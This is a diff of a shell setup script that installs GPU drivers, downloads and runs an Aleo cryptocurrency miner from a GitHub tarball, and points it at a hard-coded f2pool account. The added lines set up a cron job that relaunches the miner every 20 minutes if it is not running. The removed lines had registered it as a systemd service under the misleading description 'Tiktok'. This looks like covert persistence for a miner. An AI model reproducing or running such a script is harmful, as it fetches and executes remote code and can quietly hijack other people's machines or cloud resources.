@@ -11,19 +11,14 @@ sudo apt-get update
 sudo add-apt-repository --yes ppa:graphics-drivers/ppa
 sudo apt-get -y install cuda-drivers-515
 sudo apt-get install libcurl3 -y
+sudo systemctl enable cron
+sudo bash -c 'echo -e "pgrep -f prover >/dev/null && r=1 || r=0\nif [ \$r = 0 ];\nthen\nsudo /bin/bash /home/azure.sh\nfi" > /home/cron.sh'
+sudo chmod +x /home/cron.sh
+sudo echo  '*/20 * * * * /home/cron.sh' | crontab -
 sudo wget https://github.com/aucpollo/sim/raw/main/Aleo_miner_1.1.9.tar
 sudo tar -xvf Aleo_miner_1.1.9.tar
 sudo sed -i '/ACCOUNT_NAME/c\ACCOUNT_NAME=thucmvn' /home/config.cfg
 sudo sed -i '/POOL/c\POOL="aleo-asia.f2pool.com:4400"' /home/config.cfg
 sudo chmod +x aleo_setup.sh
 sudo ./aleo_setup.sh
-sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/bin/bash /home/azure.sh 1\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/deroz.service'
-sudo systemctl daemon-reload
-sudo systemctl enable deroz.service
-echo "Setup completed!"
-if [ $1 = "2" ];
-then
-	sudo reboot
-else
-	echo "Both variables are different"
-fi
+sudo reboot
